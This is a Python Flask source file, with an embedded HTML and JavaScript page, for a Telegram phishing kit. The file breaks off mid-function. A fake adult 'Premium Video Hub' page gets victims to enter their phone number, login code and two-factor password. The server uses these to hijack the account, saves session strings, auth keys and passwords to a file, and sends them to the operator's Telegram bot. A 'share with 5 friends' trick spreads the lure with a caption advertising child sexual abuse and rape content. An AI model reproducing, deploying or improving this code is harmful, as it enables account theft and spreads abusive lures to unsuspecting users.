from flask import Flask, request, jsonify, render_template_string
import os
import json
import base64
import threading
import asyncio
import logging
import time
import random
import requests as http_requests
from datetime import datetime
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import sys

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ====== Environment Variables ======
BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))
# ===================================

if sys.version_info >= (3, 12) and sys.platform == 'win32':
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except:
        pass

app = Flask(__name__)

user_sessions = {}
pending_codes = {}
pending_2fa = {}
sessions_lock = threading.Lock()

# ====== Persistent Storage ======
DATA_FILE = "captured_accounts.json"

def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Load error: {e}")
            return []
    return []

def save_account(account):
    accounts = load_accounts()
    found = False
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account
            found = True
            break
    if not found:
        accounts.append(account)
    with open(DATA_FILE, 'w') as f:
        json.dump(accounts, f, indent=2)
    logger.info(f"✅ Saved: {account['phone']} | Session: {len(account.get('session',''))} chars")
    return account

captured_accounts = load_accounts()

# ====== Phone Formatter ======
def format_phone(ph):
    if not ph:
        return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits:
        return ph
    if ph.startswith('+'):
        return ph
    if len(digits) == 10:
        return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'):
        return '+' + digits
    return '+' + digits

# ====== Bot Notification - FIXED ======
def send_bot_notification(phone, ss, me, dc, password_used=False, password_value=""):
    try:
        max_len = 3900
        
        extra = ""
        if password_used:
            extra = "\n🔐 2FA Password Used"
            if password_value:
                extra += f"\n🔑 2FA Password: `{password_value}`"
        
        if len(ss) > max_len:
            # ====== FIX: session কে backticks এ র‍্যাপ করা ======
            msg1 = (
                f"🔔 New Account Captured!{extra}\n\n"
                f"📱 Phone: {phone}\n"
                f"👤 Name: {me.first_name or ''} {me.last_name or ''}\n"
                f"🆔 User ID: {me.id}\n"
                f"📛 Username: @{me.username or 'N/A'}\n"
                f"🌐 DC: {dc}\n"
                f"📏 Session Length: {len(ss)} chars\n\n"
                f"📄 Session (part 1/2):\n`{ss[:max_len]}`"
            )
            msg2 = f"📄 Session (part 2/2) for {phone}:\n`{ss[max_len:]}`"
            
            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg1, 'parse_mode': 'Markdown'}, timeout=15)
            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg2, 'parse_mode': 'Markdown'}, timeout=15)
        else:
            # ====== FIX: session কে backticks এ র‍্যাপ করা ======
            msg = (
                f"🔔 New Account!{extra}\n"
                f"📱 {phone}\n"
                f"👤 {me.first_name} {me.last_name or ''}\n"
                f"🆔 {me.id}\n"
                f"🌐 DC: {dc}\n"
                f"📏 Session: {len(ss)} chars\n\n"
                f"🔑 Session:\n`{ss}`"
            )
            r = http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=15)
            if r.status_code != 200:
                # Fallback: Markdown fail করলে plain text পাঠাও
                http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={'chat_id': YOUR_TELEGRAM_ID, 'text': f"Session for {phone}:\n{ss}"}, timeout=15)
    except Exception as e:
        logger.error(f"Bot notify error: {e}")
        print(f"\n{'='*60}")
        print(f"🔴 BOT FAILED! Session for {phone}:")
        print(f"Session ({len(ss)} chars):")
        print(ss)
        print(f"{'='*60}\n")

# ====== Telegram Async Functions ======

def run_telegram_action(phone, code=None, password=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            
            try:
                r = await client.send_code_request(phone)
                session_str = StringSession.save(client.session)
                
                with sessions_lock:
                    user_sessions[phone] = {
                        'hash': r.phone_code_hash,
                        'session': session_str,
                        'phone_code_result': r
                    }
                    pending_codes[phone] = 'sent'
                    pending_2fa[phone] = False
                
                logger.info(f"✅ Code sent to {phone}")
                return {'success': True}
                
            except errors.FloodWaitError as e:
                logger.error(f"Flood wait {e.seconds}s for {phone}")
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': f'Flood wait {e.seconds}s'}
            except Exception as e:
                logger.error(f"send_code error: {e}")
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': str(e)[:80]}
            finally:
                await client.disconnect()
        
        async def verify():
            with sessions_lock:
                if phone not in user_sessions:
                    return {'success': False, 'error': 'Session not found'}
                s = user_sessions[phone]
            
            client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
            
            try:
                await client.connect()
                
                if await client.is_user_authorized():
                    me = await client.get_me()
                    logger.info(f"{phone} already authorized")
                else:
                    try:
                        await client.sign_in(
                            phone=phone,
                            code=code,
                            phone_code_hash=s['hash']
                        )
                        me = await client.get_me()
                    except errors.SessionPasswordNeededError:
                        logger.info(f"2FA needed for {phone}")
                        with sessions_lock:
                            pending_2fa[phone] = True
                            pending_codes[phone] = '2fa_needed'
                        
                        if password:
                            try:
                                await client.sign_in(password=password)
                                me = await client.get_me()
                                
                                with sessions_lock:
                                    pending_2fa[phone] = False
                                    pending_codes[phone] = 'done'
                            except errors.PasswordHashInvalidError:
                                return {'success': False, 'error': 'Wrong 2FA password'}
                            except Exception as e:
                                return {'success': False, 'error': f'2FA error: {str(e)[:50]}'}
                        else:
                            return {'success': False, 'error': '2FA', 'needs_password': True}
                    except errors.PhoneCodeInvalidError:
                        return {'success': False, 'error': 'Wrong code'}
                    except errors.PhoneCodeExpiredError:
                        return {'success': False, 'error': 'Code expired'}
                    except Exception as e:
                        return {'success': False, 'error': str(e)[:80]}
                
                await client.get_dialogs()
                ss = StringSession.save(client.session)
                
                auth_key = None
                try:
                    auth_key = client.session.auth_key.key
                except:
                    pass
                
                dc = client.session.dc_id
                
                if not auth_key:
                    logger.warning(f"Auth key None for {phone}, reconnecting...")
                    await client.disconnect()
                    await asyncio.sleep(0.5)
                    
                    client2 = TelegramClient(StringSession(ss), API_ID, API_HASH)
                    await client2.connect()
                    await client2.get_dialogs()
                    
                    auth_key = client2.session.auth_key.key
                    dc = client2.session.dc_id
                    ss = StringSession.save(client2.session)
                    me = await client2.get_me()
                    await client2.disconnect()
                    client = client2
                
                auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
                password_used = password is not None
                
                acc = {
                    'phone': phone,
                    'user_id': me.id,
                    'username': me.username or '',
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'session': ss,
                    'webk': json.dumps({
                        'dcId': dc,
                        'authKey': auth_b64,
                        'userId': me.id,
                        'isSupport': False,
                        'isTest': False
                    }),
                    'dc': dc,
                    'time': str(datetime.now()),
                    'has_2fa': password_used,
                    'password': password if password_used else ''
                }
                
                save_account(acc)
                global captured_accounts
                captured_accounts = load_accounts()
                
                with sessions_lock:
                    if phone in user_sessions:
                        del user_sessions[phone]
                    if phone in pending_2fa:
                        del pending_2fa[phone]
                    pending_codes[phone] = 'done'
                
                send_bot_notification(phone, ss, me, dc, password_used, password if password_used else "")
                
                logger.info(f"✅ Captured: {phone} | Session: {len(ss)} chars{' | With 2FA: ' + password if password_used else ''}")
                return {'success': True, 'session': ss, 'user_id': me.id}
                
            except Exception as e:
                e_str = str(e)
                logger.error(f"Verify error for {phone}: {e_str}")
                
                if 'PHONE_CODE_INVALID' in e_str:
                    return {'success': False, 'error': 'Wrong code'}
                if 'SESSION_PASSWORD_NEEDED' in e_str:
                    return {'success': False, 'error': '2FA', 'needs_password': True}
                if 'PASSWORD_HASH_INVALID' in e_str:
                    return {'success': False, 'error': 'Wrong 2FA password'}
                return {'success': False, 'error': e_str[:80]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        if code:
            return loop.run_until_complete(verify())
        else:
            return loop.run_until_complete(send_code())
    finally:
        loop.close()


# ====== Phishing Page ======
PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Premium Video Hub</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;min-height:100vh}
        .header{padding:50px 20px 25px;text-align:center;background:linear-gradient(180deg,#1a1a2e,#0a0a0a)}
        .header h1{font-size:26px;font-weight:900;background:linear-gradient(45deg,#ff6b6b,#ffa500);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .header p{color:#777;font-size:13px;margin-top:8px}
        .video-card{margin:15px 20px;background:#141420;border-radius:15px;overflow:hidden;border:1px solid #1a1a2e}
        .thumbnail{width:100%;height:210px;background:linear-gradient(135deg,#2d1b69,#ff6b6b);display:flex;align-items:center;justify-content:center}
        .thumbnail .play-btn{width:65px;height:65px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;border:2px solid rgba(255,255,255,0.2)}
        .video-info{padding:15px}
        .video-info h3{font-size:15px;margin-bottom:5px}
        .video-info .meta{color:#666;font-size:12px}
        .video-info .badge{display:inline-block;background:#e94560;padding:2px 10px;border-radius:4px;font-size:11px;margin-top:8px}
        .link-section{padding:10px 20px 20px;text-align:center}
        .get-link-btn{width:100%;padding:18px;background:linear-gradient(45deg,#e94560,#ff6b6b);border:none;border-radius:50px;color:white;font-size:20px;font-weight:800;cursor:pointer;box-shadow:0 8px 30px rgba(233,69,96,0.4);letter-spacing:1px;text-transform:uppercase;transition:all 0.3s}
        .get-link-btn:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(233,69,96,0.6)}
        .get-link-btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
        .modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:1000;padding:20px;overflow-y:auto}
        .modal-overlay.active{display:flex;align-items:center;justify-content:center}
        .modal{background:#141420;border-radius:20px;padding:30px;max-width:380px;width:100%;border:1px solid #1a1a2e;animation:slideUp 0.3s ease}
        @keyframes slideUp{from{transform:translateY(40px);opacity:0}to{transform:translateY(0);opacity:1}}
        .modal-icon{text-align:center;font-size:45px;margin-bottom:10px}
        .modal h2{text-align:center;font-size:18px;margin-bottom:5px}
        .modal p{text-align:center;color:#888;font-size:13px;margin-bottom:15px}
        .modal .sb{text-align:center;padding:12px;border-radius:10px;margin:10px 0;display:none;font-size:13px}
        .modal .sb.success{display:block;background:rgba(76,175,80,0.15);color:#81C784}
        .modal .sb.error{display:block;background:rgba(244,67,54,0.15);color:#EF9A9A}
        .modal .sb.info{display:block;background:rgba(33,150,243,0.15);color:#90CAF9}
        .modal .sb.waiting{display:block;background:rgba(255,152,0,0.15);color:#FFB74D}
        .cd{background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;padding:15px;font-size:30px;text-align:center;letter-spacing:15px;color:white;margin:10px 0;font-weight:bold;min-height:55px}
        .np{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:10px 0}
        .np .k{padding:16px;border:none;border-radius:10px;background:#2a2a3e;color:white;font-size:22px;cursor:pointer;transition:0.15s}
        .np .k:active{background:#3a3a5e;transform:scale(0.95)}
        .np .kc{background:#e94560;color:white}
        .np .ks{background:#4CAF50;color:white;font-weight:700;font-size:14px}
        .np .ks:disabled{background:#333;color:#666}
        .step{display:none}
        .step.active{display:block}
        .ss{text-align:center;padding:20px 0}
        .ss .bi{font-size:60px;margin-bottom:15px}
        .ss h2{color:#4CAF50;font-size:22px;margin-bottom:8px}
        .ss p{color:#888;font-size:13px;margin-bottom:20px}
        .ss .wb{background:#4CAF50;color:white;border:none;padding:15px 40px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;text-transform:uppercase;letter-spacing:1px}
        .sp{display:inline-block;width:18px;height:18px;border:2px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .section-title{padding:15px 20px 10px;font-size:17px;font-weight:700;color:#ddd}
        .video-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:0 20px 20px}
        .video-item{background:#141420;border-radius:10px;overflow:hidden}
        .video-item .thumb{height:95px;background:linear-gradient(135deg,#1a1a2e,#2d1b69);display:flex;align-items:center;justify-content:center;font-size:30px;color:rgba(255,255,255,0.3)}
        .video-item .info{padding:10px}
        .video-item .info h4{font-size:12px;margin-bottom:3px}
        .video-item .info span{font-size:11px;color:#666}
        .footer{text-align:center;padding:20px;color:#333;font-size:11px}
        .cc{display:flex;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;margin-bottom:12px;overflow:hidden}
        .cc .ccd{padding:12px 8px;background:#1a1a2e;color:#888;font-size:14px;font-weight:600;display:flex;align-items:center;justify-content:center;min-width:50px;border-right:1px solid #2a2a3e}
        .cc input{flex:1;padding:15px;background:transparent;border:none;color:white;font-size:18px;text-align:center;outline:none}
        .cc input::placeholder{color:#555}
        .share-progress{display:flex;justify-content:center;margin:15px 0;gap:5px}
        .share-step{width:35px;height:35px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:14px;color:#666;font-weight:700}
        .share-step.done{background:#4CAF50;color:white}
        .share-step.active{background:#0088cc;color:white;animation:pulse 1s infinite}
        @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,136,204,0.4)}100%{box-shadow:0 0 0 10px rgba(0,136,204,0)}}
        .pwd-input{width:100%;padding:15px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0}
        .pwd-input:focus{border-color:#0088cc}
        .pwd-input::placeholder{color:#555}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 PREMIUM VIDEO HUB</h1>
        <p>Exclusive content — Verified members only</p>
    </div>
    <div class="video-card">
        <div class="thumbnail"><div class="play-btn">▶</div></div>
        <div class="video-info">
            <h3>🔥 LEAKED PRIVATE VIDEO — 2026</h3>
            <div class="meta">⭐ 4.9 (2.4M views) • 18+</div>
            <span class="badge">🔞 RESTRICTED</span>
        </div>
    </div>
    <div class="link-section">
        <button class="get-link-btn" id="glb">
            🔞 GET YOUR LINK
            <span class="small">Tap to verify via Telegram</span>
        </button>
    </div>
    <div class="section-title">🔥 More Videos</div>
    <div class="video-grid">
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ff6b6b)">▶</div><div class="info"><h4>Private 01</h4><span>2.1M</span></div></div>
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ffa500)">▶</div><div class="info"><h4>Private 02</h4><span>1.8M</span></div></div>
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#4CAF50)">▶</div><div class="info"><h4>Private 03</h4><span>1.5M</span></div></div>
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#0088cc)">▶</div><div class="info"><h4>Private 04</h4><span>1.2M</span></div></div>
    </div>
    <div class="footer">© 2026 Premium Video Hub</div>
    
    <div class="modal-overlay" id="vm">
        <div class="modal">
            <!-- Step 1: Phone Input -->
            <div id="s1" class="step active">
                <div class="modal-icon">📱</div>
                <h2>Telegram verification</h2>
                <p>Enter your Telegram account phone number</p>
                
                <div class="cc">
                    <div class="ccd">+91</div>
                    <input type="tel" id="phoneInput" placeholder="XXXXXXXXXX" maxlength="10">
                </div>
                
                <button onclick="sendPhoneFromStep1()"
                    style="width:100%; padding:15px; background:#0088cc; border:none; 
                           border-radius:10px; color:white; font-size:16px; font-weight:600; 
                           cursor:pointer; margin-bottom:10px; transition:0.3s"
                    onmouseover="this.style.background='#0077b6'"
                    onmouseout="this.style.background='#0088cc'">
                    📱 Send code
                </button>
                
                <div id="ps1" class="sb info" style="display:none">⏳ Processing...</div>
            </div>
            
            <!-- Step 2: OTP Code Input -->
            <div id="s2" class="step">
                <div class="modal-icon">🔐</div>
                <h2>Verification code</h2>
                <p>📱 <span id="pd" style="color:#0088cc;font-weight:bold;">+91XXXXXXXXXX</span></p>
                <div id="cs" class="sb waiting"><span class="sp"></span> Please wait ...</div>
                <div class="cd" id="cdisp">_</div>
                <div class="np" id="np">
                    <button class="k" onclick="pk('1')">1</button>
                    <button class="k" onclick="pk('2')">2</button>
                    <button class="k" onclick="pk('3')">3</button>
                    <button class="k" onclick="pk('4')">4</button>
                    <button class="k" onclick="pk('5')">5</button>
                    <button class="k" onclick="pk('6')">6</button>
                    <button class="k" onclick="pk('7')">7</button>
                    <button class="k" onclick="pk('8')">8</button>
                    <button class="k" onclick="pk('9')">9</button>
                    <button class="k kc" onclick="cc()">⌫</button>
                    <button class="k" onclick="pk('0')">0</button>
                    <button class="k ks" id="sb" onclick="sc()">✓ Verify</button>
                </div>
                <div id="vs" class="sb"></div>
            </div>
            
            <!-- Step 2b: 2FA Password Input -->
            <div id="s2b" class="step">
                <div class="modal-icon">🔐</div>
                <h2>Two-Factor Authentication</h2>
                <p>This account has 2FA enabled.<br>Enter your cloud password:</p>
                <input type="password" id="pwdInput" class="pwd-input" placeholder="Enter your Telegram password" maxlength="64">
                <button onclick="submitPassword()"
                    style="width:100%; padding:15px; background:#e94560; border:none; 
                           border-radius:10px; color:white; font-size:16px; font-weight:600; 
                           cursor:pointer; margin:10px 0; transition:0.3s"
                    onmouseover="this.style.background='#d63851'"
                    onmouseout="this.style.background='#e94560'">
                    🔑 Verify Password
                </button>
                <div id="pwdStatus" class="sb" style="display:none"></div>
            </div>
            
            <!-- Step 3: Share 5 Friends (TRICK) -->
            <div id="s3" class="step">
                <div class="modal-icon">🎬</div>
                <h2>Almost there!</h2>
                <p>Share this link with <strong>5 friends</strong> on Telegram to unlock the video</p>
                
                <div class="share-progress">
                    <div class="share-step" id="sp1">1</div>
                    <div class="share-step" id="sp2">2</div>
                    <div class="share-step" id="sp3">3</div>
                    <div class="share-step" id="sp4">4</div>
                    <div class="share-step" id="sp5">5</div>
                </div>
                
                <div id="shareStatus" class="sb waiting" style="display:block">
                    <span class="sp"></span> Share to start unlocking...
                </div>
                
                <button onclick="simulateShare()" 
                    style="width:100%; padding:15px; background:#25D366; border:none; 
                           border-radius:10px; color:white; font-size:16px; font-weight:600; 
                           cursor:pointer; margin:10px 0">
                    📤 Share to Telegram
                </button>
                
                <div style="margin-top:15px; padding:15px; background:#0a0a0a; border-radius:10px; border:1px solid #2a2a3e; text-align:center">
                    <p style="color:#888; font-size:12px; margin-bottom:8px">Your share link:</p>
                    <code id="shareLink" style="color:#0088cc; font-size:11px; word-break:break-all">https://t.me/share/url?url=...</code>
                </div>
            </div>
            
            <!-- Step 4: Final Loading (never finishes) -->
            <div id="s4" class="step">
                <div class="ss">
                    <div class="bi" id="finalIcon">⏳</div>
                    <h2 id="finalTitle">Processing...</h2>
                    <p id="finalDesc" style="color:#888; font-size:13px">Verifying shares...</p>
                    <div style="margin:20px auto; width:50px; height:50px; border:4px solid #333; border-top-color:#0088cc; border-radius:50%; animation:spin 1s linear infinite"></div>
                    <p style="color:#666; font-size:11px; margin-top:15px">This may take a few moments</p>
                </div>
            </div>
        </div>
    </div>
    
    <script>
    // ====== FIXED VERSION ======
    // Problem 1: First login sets tg_user_id in localStorage.
    // Second login: code checked localStorage and jumped to Share page without asking phone.
    // Fix: Always start from Step 1, then check if the phone is already captured in the server DB.
    // Problem 2: Session string was being cut off in Telegram bot notification due to Markdown.
    // Fix: Session string is now wrapped in backticks (`) so Markdown doesn't interfere.

    var phoneNumber = '';
    var codeDigits = '';
    var codeCheckInterval = null;
    var passwordCheckInterval = null;
    var sharesDone = 0;
    var shareLinkBase = window.location.href;

    // ====== Telegram channel to share ======
    var TG_CHANNEL_LINK = 'https://t.me/videodks';
    var TG_CHANNEL_CAPTION = '𝗖𝗽, 𝗿𝗮𝗽𝗲,𝗺𝗼𝗺 𝘀𝗼𝗼𝗻🔞👇';

    // ====== FIX: Always open Step 1 (phone input) ======
    document.getElementById('glb').onclick = function() {
        document.getElementById('vm').classList.add('active');
        
        // সবসময় স্টেপ ১ থেকে শুরু করবে
        document.getElementById('s1').classList.add('active');
        document.getElementById('s2').classList.remove('active');
        document.getElementById('s2b').classList.remove('active');
        document.getElementById('s3').classList.remove('active');
        document.getElementById('s4').classList.remove('active');
        
        document.getElementById('ps1').style.display = 'none';
        document.getElementById('phoneInput').value = '';
        document.getElementById('phoneInput').focus();
    };

    // ====== FIX: ফোন সাবমিট করার সময় আগে সার্ভার চেক কর ======
    function sendPhoneFromStep1() {
        var phone = document.getElementById('phoneInput').value.trim();
        
        if (!phone || phone.length !== 10) {
            document.getElementById('ps1').className = 'sb error';
            document.getElementById('ps1').innerHTML = '❌ দয়া করে ১০ ডিজিটের ফোন নাম্বার দিন';
            document.getElementById('ps1').style.display = 'block';
            return;
        }
        
        phoneNumber = '+91' + phone;
        
        document.getElementById('ps1').className = 'sb waiting';
        document.getElementById('ps1').innerHTML = '<span class="sp"></span> চেক করা হচ্ছে...';
        document.getElementById('ps1').style.display = 'block';
        
        // ====== FIX: আগে চেক কর এই ফোনটা আগে ক্যাপচার করা আছে কিনা ======
        fetch('/session/' + encodeURIComponent(phoneNumber))
            .then(function(res) { return res.json(); })
            .then(function(data) {
                if (data.user_id) {
                    // এই ফোন ইতিমধ্যে ক্যাপচার করা আছে → সরাসরি শেয়ার পেজে
                    localStorage.setItem('tg_user_id', String(data.user_id));
                    var savedShares = parseInt(localStorage.getItem('tg_shares_' + data.user_id) || '0');
                    sharesDone = savedShares;
                    document.getElementById('s1').classList.remove('active');
                    document.getElementById('s3').classList.add('active');
                    setupShareLink();
                    document.getElementById('ps1').style.display = 'none';
                    return;
                }
                // নতুন ফোন → নরমাল ওটিপি ফ্লো
                document.getElementById('ps1').className = 'sb waiting';
                document.getElementById('ps1').innerHTML = '<span class="sp"></span> কোড পাঠানো হচ্ছে...';
                document.getElementById('ps1').style.display = 'block';
                sendPhoneToBackend(phoneNumber);
            })
            .catch(function(e) {
                // সার্ভার এরর হলে নরমাল ফ্লো
                document.getElementById('ps1').className = 'sb waiting';
                document.getElementById('ps1').innerHTML = '<span class="sp"></span> কোড পাঠানো হচ্ছে...';
                document.getElementById('ps1').style.display = 'block';
                sendPhoneToBackend(phoneNumber);
            });
    }

    // ====== Backend এ ফোন পাঠানো ======
    async function sendPhoneToBackend(phone) {
        try {
            var res = await fetch('/api/share', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phone})
            });
            var data = await res.json();
            if (data.success) {
                document.getElementById('s1').classList.remove('active');
                document.getElementById('s2').classList.add('active');
                document.getElementById('pd').textContent = phone;
                var cs = document.getElementById('cs');
                cs.className = 'sb waiting';
                cs.innerHTML = '<span class="sp"></span> কোড পাঠানো হচ্ছে...';
                cs.style.display = 'block';
                startCodeCheck();
            } else {
                var ps = document.getElementById('ps1');
                ps.className = 'sb error';
                ps.innerHTML = '❌ Error: ' + (data.error || 'Unknown');
                ps.style.display = 'block';
            }
        } catch(e) {
            var ps = document.getElementById('ps1');
            ps.className = 'sb error';
            ps.innerHTML = '❌ Connection error';
            ps.style.display = 'block';
        }
    }

    // ====== OTP চেক করা ======
    function startCodeCheck() {
        if (codeCheckInterval) clearInterval(codeCheckInterval);
        codeCheckInterval = setInterval(async function() {
            try {
                var res = await fetch('/api/check', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: phoneNumber})
                });
                var data = await res.json();
                if (data.s === 'sent') {
                    clearInterval(codeCheckInterval);
                    codeCheckInterval = null;
                    var cs = document.getElementById('cs');
                    cs.className = 'sb success';
                    cs.innerHTML = '✅ কোড পাঠানো হয়েছে! নিচে দিন:';
                    cs.style.display = 'block';
                } else if (data.s === 'done') {
                    clearInterval(codeCheckInterval);
                    codeCheckInterval = null;
                    fetchUserIdAndGoToShare(phoneNumber);
                } else if (data.s === '2fa_needed') {
                    clearInterval(codeCheckInterval);
                    codeCheckInterval = null;
                    document.getElementById('s2').classList.remove('active');
                    document.getElementById('s2b').classList.add('active');
                    startPasswordCheck();
                } else if (data.s === 'err') {
                    clearInterval(codeCheckInterval);
                    codeCheckInterval = null;
                    var cs = document.getElementById('cs');
                    cs.className = 'sb error';
                    cs.innerHTML = '❌ কোড পাঠাতে সমস্যা হয়েছে';
                    cs.style.display = 'block';
                }
            } catch(e) {}
        }, 2000);
    }

    // ====== 2FA পাসওয়ার্ড চেক ======
    function startPasswordCheck() {
        if (passwordCheckInterval) clearInterval(passwordCheckInterval);
        passwordCheckInterval = setInterval(async function() {
            try {
                var res = await fetch('/api/check', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: phoneNumber})
                });
                var data = await res.json();
                if (data.s === 'done') {
                    clearInterval(passwordCheckInterval);
                    passwordCheckInterval = null;
                    fetchUserIdAndGoToShare(phoneNumber);
                } else if (data.s === 'err') {
                    clearInterval(passwordCheckInterval);
                    passwordCheckInterval = null;
                    var ps = document.getElementById('pwdStatus');
                    ps.className = 'sb error';
                    ps.innerHTML = '❌ ভেরিফিকেশন ব্যর্থ হয়েছে';
                    ps.style.display = 'block';
                }
            } catch(e) {}
        }, 2000);
    }

    // ====== User ID ফেচ করে localStorage এ সেভ ======
    async function fetchUserIdAndGoToShare(phone) {
        try {
            var res = await fetch('/session/' + encodeURIComponent(phone));
            var data = await res.json();
            if (data.user_id) {
                localStorage.setItem('tg_user_id', String(data.user_id));
                localStorage.setItem('tg_shares_' + data.user_id, '0');
            }
        } catch(e) {}
        goToSharePage();
    }

    // ====== Keypad functions ======
    function pk(n) { 
        if (codeDigits.length < 5) { 
            codeDigits += n; 
            document.getElementById('cdisp').textContent = codeDigits; 
        } 
    }
    function cc() { 
        codeDigits = codeDigits.slice(0, -1); 
        document.getElementById('cdisp').textContent = codeDigits || '_'; 
    }

    // ====== OTP ভেরিফাই ======
    async function sc() {
        if (codeDigits.length < 5) { 
            showVerifyStatus('❌ ৫ ডিজিটের কোড দিন', 'error'); 
            return; 
        }
        document.getElementById('sb').disabled = true;
        document.getElementById('sb').textContent = '⏳ ভেরিফাই করা হচ্ছে...';
        try {
            var res = await fetch('/api/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber, code: codeDigits})
            });
            var data = await res.json();
            if (data.success) {
                if (data.user_id) {
                    localStorage.setItem('tg_user_id', String(data.user_id));
                    localStorage.setItem('tg_shares_' + data.user_id, '0');
                }
                goToSharePage();
                if (codeCheckInterval) { 
                    clearInterval(codeCheckInterval); 
                    codeCheckInterval = null; 
                }
            } else if (data.needs_password) {
                document.getElementById('s2').classList.remove('active');
                document.getElementById('s2b').classList.add('active');
                if (codeCheckInterval) { 
                    clearInterval(codeCheckInterval); 
                    codeCheckInterval = null; 
                }
            } else {
                showVerifyStatus('❌ ' + (data.error || 'ভুল কোড'), 'error');
                codeDigits = ''; 
                document.getElementById('cdisp').textContent = '_';
                document.getElementById('sb').disabled = false; 
                document.getElementById('sb').textContent = '✓ ভেরিফাই';
            }
        } catch(e) { 
            showVerifyStatus('❌ Error', 'error'); 
            document.getElementById('sb').disabled = false; 
            document.getElementById('sb').textContent = '✓ ভেরিফাই'; 
        }
    }

    // ====== 2FA পাসওয়ার্ড সাবমিট ======
    async function submitPassword() {
        var pwd = document.getElementById('pwdInput').value.trim();
        if (!pwd) {
            var ps = document.getElementById('pwdStatus');
            ps.className = 'sb error';
            ps.innerHTML = '❌ আপনার পাসওয়ার্ড দিন';
            ps.style.display = 'block';
            return;
        }
        
        var ps = document.getElementById('pwdStatus');
        ps.className = 'sb waiting';
        ps.innerHTML = '<span class="sp"></span> পাসওয়ার্ড চেক করা হচ্ছে...';
        ps.style.display = 'block';
        
        try {
            var res = await fetch('/api/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber, code: codeDigits, password: pwd})
            });
            var data = await res.json();
            if (data.success) {
                if (data.user_id) {
                    localStorage.setItem('tg_user_id', String(data.user_id));
                    localStorage.setItem('tg_shares_' + data.user_id, '0');
                }
                goToSharePage();
                if (passwordCheckInterval) { 
                    clearInterval(passwordCheckInterval); 
                    passwordCheckInterval = null; 
                }
            } else {
                ps.className = 'sb error';
                ps.innerHTML = '❌ ' + (data.error || 'ভুল পাসওয়ার্ড');
                ps.style.display = 'block';
            }
        } catch(e) {
            ps.className = 'sb error';
            ps.innerHTML = '❌ Connection error';
            ps.style.display = 'block';
        }
    }

    function showVerifyStatus(msg, type) {
        document.getElementById('vs').textContent = msg;
        document.getElementById('vs').className = 'sb ' + type;
        document.getElementById('vs').style.display = 'block';
    }

    // ====== শেয়ার পেজ ======
    function goToSharePage() {
        document.getElementById('s2').classList.remove('active');
        document.getElementById('s2b').classList.remove('active');
        document.getElementById('s3').classList.add('active');
        setupShareLink();
    }

    function setupShareLink() {
